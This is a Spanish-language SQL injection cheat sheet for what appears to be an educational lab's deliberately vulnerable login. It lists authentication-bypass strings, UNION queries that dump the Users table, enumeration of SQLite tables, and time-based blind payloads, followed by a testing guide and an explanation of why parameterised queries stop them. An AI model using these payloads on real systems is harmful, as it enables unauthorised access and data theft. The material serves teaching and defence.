# 🎯 Cheat Sheet - SQL Injection Payloads

Colección de payloads para probar en el **Login Vulnerable**. Úsalos para comprender mejor cómo funcionan los ataques SQL Injection.

---

## 🔓 Bypass de Autenticación

### Básico - OR siempre verdadero

```
Usuario: admin' OR '1'='1
Contraseña: (vacío)
```
```sql
-- Query resultante:
SELECT * FROM Users WHERE Username = 'admin' OR '1'='1' AND Password = ''
```

---

```
Usuario: admin' OR 1=1--
Contraseña: (cualquiera)
```
```sql
-- Query resultante:
SELECT * FROM Users WHERE Username = 'admin' OR 1=1--' AND Password = 'cualquiera'
-- El -- comenta el resto
```

---

```
Usuario: ' OR '1'='1
Contraseña: ' OR '1'='1
```
```sql
-- Query resultante:
SELECT * FROM Users WHERE Username = '' OR '1'='1' AND Password = '' OR '1'='1'
```

---

### Usando comentarios SQL

```
Usuario: admin'--
Contraseña: (cualquiera)
```
```sql
-- Query resultante:
SELECT * FROM Users WHERE Username = 'admin'--' AND Password = 'cualquiera'
-- Todo después de -- es comentario
```

---

```
Usuario: admin'#
Contraseña: (cualquiera)
```
```sql
-- Query resultante (en MySQL):
SELECT * FROM Users WHERE Username = 'admin'#' AND Password = 'cualquiera'
-- En MySQL, # también comenta
```

---

### OR con diferentes valores verdaderos

```
Usuario: ' OR 'x'='x
Contraseña: (vacío)
```

```
Usuario: ' OR 'a'='a
Contraseña: (vacío)
```

```
Usuario: ') OR ('1'='1
Contraseña: (vacío)
```

---

## 🔍 Obtener primer usuario

```
Usuario: ' OR 1=1 LIMIT 1--
Contraseña: (cualquiera)
```
```sql
-- Query resultante:
SELECT * FROM Users WHERE Username = '' OR 1=1 LIMIT 1--' AND Password = ''
-- Devuelve solo el primer registro
```

---

## 🧪 Inyección en ambos campos

```
Usuario: admin
Contraseña: ' OR '1'='1
```
```sql
-- Query resultante:
SELECT * FROM Users WHERE Username = 'admin' AND Password = '' OR '1'='1'
```

---

## 💥 Ataques más avanzados (algunos pueden no funcionar en SQLite)

### UNION-based SQL Injection

```
Usuario: ' UNION SELECT Id, Username, Password, Email, Role FROM Users--
Contraseña: (vacío)
```
```sql
-- Intenta combinar resultados de dos queries
SELECT * FROM Users WHERE Username = '' UNION SELECT Id, Username, Password, Email, Role FROM Users--'
```

---

### Enumeración de columnas

```
Usuario: ' ORDER BY 1--
Usuario: ' ORDER BY 2--
Usuario: ' ORDER BY 3--
Usuario: ' ORDER BY 4--
Usuario: ' ORDER BY 5--
```
```sql
-- Prueba cuántas columnas tiene la tabla
-- Cuando falla, sabes que llegaste al límite
```

---

### Obtener información de la base de datos (SQLite)

```
Usuario: ' UNION SELECT 1,sqlite_version(),3,4,5--
Contraseña: (vacío)
```

```
Usuario: ' UNION SELECT 1,name,3,4,5 FROM sqlite_master WHERE type='table'--
Contraseña: (vacío)
```

---

### Time-based Blind SQL Injection (SQLite)

```
Usuario: admin' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE randomblob(100000000) END)--
Contraseña: (vacío)
```

---

## 🎭 Variaciones con diferentes sintaxis

### Con paréntesis

```
Usuario: ') OR ('1'='1
Contraseña: (vacío)
```

```
Usuario: ')) OR (('1'='1
Contraseña: (vacío)
```

---

### Con AND en lugar de WHERE

```
Usuario: admin' AND '1'='2' OR '1'='1
Contraseña: (vacío)
```

---

### Usando concatenación

```
Usuario: admin'||'admin
Contraseña: (vacío)
```

---

## 🛠️ Payloads de diagnóstico

### Provocar errores SQL (útil para obtener información)

```
Usuario: admin'
Contraseña: (vacío)
```
```
-- Error: unrecognized token: "'"
-- Confirma que el input no está sanitizado
```

---

```
Usuario: admin''
Contraseña: (vacío)
```
```
-- Doble comilla simple escapa la comilla en SQL
```

---

```
Usuario: admin' AND '1'='1
Contraseña: (vacío)
```
```
-- Si funciona, confirma SQL Injection
```

```
Usuario: admin' AND '1'='2
Contraseña: (vacío)
```
```
-- Si falla, confirma SQL Injection
```

---

## 📋 Tabla Resumen de Técnicas

| Técnica | Payload Ejemplo | Propósito |
|---------|----------------|-----------|
| OR Bypass | `' OR '1'='1` | Hacer la condición siempre verdadera |
| Comentarios | `admin'--` | Eliminar el resto de la query |
| UNION | `' UNION SELECT...` | Obtener datos de otras tablas |
| Time-based | `' AND SLEEP(5)--` | Confirmar inyección sin output |
| Error-based | `' AND 1=1--` | Obtener info de errores SQL |
| Boolean-based | `' AND '1'='1` vs `' AND '1'='2` | Inferir datos por respuestas |

---

## 🎯 Guía de Pruebas Paso a Paso

### Paso 1: Confirmar la vulnerabilidad
1. Prueba: `admin'`
   - ¿Hay error SQL? → Vulnerable
   
2. Prueba: `admin''`
   - ¿Login intenta funcionar? → Vulnerable

### Paso 2: Bypass básico
3. Prueba: `admin' OR '1'='1`
   - ¿Acceso concedido? → Éxito

### Paso 3: Comentar password
4. Prueba: `admin'--`
   - ¿Acceso concedido? → Éxito

### Paso 4: Exploración avanzada
5. Prueba UNION attacks
6. Enumera tablas y columnas
7. Extrae datos sensibles

---

## ⚠️ Recordatorio Importante

**Estos payloads son para el entorno de pruebas únicamente.**

- ✅ Úsalos en el Login Vulnerable de este proyecto educativo
- ✅ Aprende cómo funcionan para defenderte mejor
- ✅ Entiende por qué las consultas parametrizadas los previenen
- ❌ NUNCA uses esto en sistemas reales sin autorización
- ❌ El uso no autorizado es ilegal y no ético

---

## 🔐 ¿Por qué fallan en el Login Seguro?

Todos estos payloads **fallan** en el Login Seguro porque:

```csharp
// Código seguro:
command.Parameters.AddWithValue("@username", userInput);
```

El driver de la base de datos:
1. Escapa automáticamente caracteres especiales
2. Trata el input como un **valor literal**, no código
3. Busca un usuario llamado literalmente `admin' OR '1'='1`
4. Como ese usuario no existe, el login falla

**Ejemplo:**
```sql
-- Con parámetros, esto:
Usuario: admin' OR '1'='1

-- Se convierte en:
SELECT * FROM Users WHERE Username = 'admin'' OR ''1''=''1' AND Password = '...'
-- Busca literalmente ese texto, no lo ejecuta como código
```

---

## 📚 Para aprender más

- [PortSwigger SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [PayloadsAllTheThings - SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)

---

**Practica responsablemente. Aprende para defender, no para atacar. 🛡️**
